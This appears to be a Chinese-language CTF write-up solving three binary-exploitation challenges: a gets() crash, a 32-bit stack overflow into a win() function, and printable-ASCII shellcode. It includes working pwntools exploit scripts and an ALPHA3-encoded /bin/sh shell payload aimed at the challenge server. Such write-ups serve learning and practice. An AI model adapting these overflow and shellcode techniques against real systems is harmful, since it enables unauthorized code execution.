# 1 Smash the stack

题目使用了gets()，会无限读输入。吃到段错误就会吐出flag，输入一长串任意字符得到flag

# 2 Check and overlap
在ida的反汇编中，vuln函数与win函数大致如下：
```cpp
int vuln(){
  char s[108]; // [esp+Ch] [ebp-6Ch] BYREF
  gets(s);
  return puts(s);
}

char *__cdecl win(int a1, int a2){
  char *result; // eax
  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF
  FILE *stream; // [esp+4Ch] [ebp-Ch]

  stream = fopen("flag.txt", "r");
  if ( !stream ){
    exit(0);
  }else{
    result = fgets(s, 64, stream);
    if ( a1 == 0xDEADBEEF && a2 == 0xDEADC0DE ){
      result = (char *)printf(s);
    }
  return result;
  }
}
```
vuln会向大小为108的char数组写入输入的全部内容。思路为填满108个字符，造成ROP。  
同时修改win传入的第1、2个参数，脚本如下：
```python
from pwn import *

p = remote("ali.infury.org", 10002)
trash_data = b'a' * 108             # 填满s[108]
cover_ebp = b'b' * 4                # 栈中s后紧跟是ebp，之后才是eip，在x86系统中，ebp是四个字节
win_address = p32(0x80485cb)        # win函数的地址，用它覆盖掉eip，vuln执行完后就会跳转到win
return_address = p32(0xffffffff)    # 第0个参数是win执行完后的返回地址
parameter_1 = p32(0xdeadbeef)       # 第一个参数
parameter_2 = p32(0xdeadc0de)       # 第二个参数
p.sendlineafter(b'string: ', trash_data + cover_ebp + win_address +
                return_address + parameter_1 + parameter_2)
p.interactive()
```
执行脚本得到flag

# Perfectly secure from shellcode
题目直接给出了源码：
```cpp
// gcc -m64 -z execstack -fPIE -pie -z now chall3.c -o chall3
int main() {
    char buf[0x400];
    int n, i;
    n = read(0, buf, 0x400);
    if (n <= 0) return 0;
    for (i = 0; i < n; i++) {
        if(buf[i] < 32 || buf[i] > 126) return 0;
    }
    ((void(*)(void))buf)();
}
```
程序会直接执行输入的payload，但是仅限可打印的ASCII字符。  
github上的alpha3仓库可以将任意shellcode转换为可打印字符，并支持多种架构和字符集  
用shellcraft生成/bin/sh的shellcode，并用alpha3编码，最后发送payload获得shell  
注意程序采用read获取输入，要发送够read吃入的长度。
```python
from pwn import *
import os


context.arch = 'amd64'
f = open("a.bin", "wb")
f.write(asm(shellcraft.sh()))
f.close()

os.system("python ./ALPHA3.py x64 ascii mixedcase rax --input=a.bin > 1.txt")
f = open("1.txt", "r")
l = f.read()
f.close()

p = remote("ali.infury.org", 10003)
p.send(l.encode()+b'a' * (0x400 - len(l)))
p.sendline("cat flag.txt")
p.interactive()
```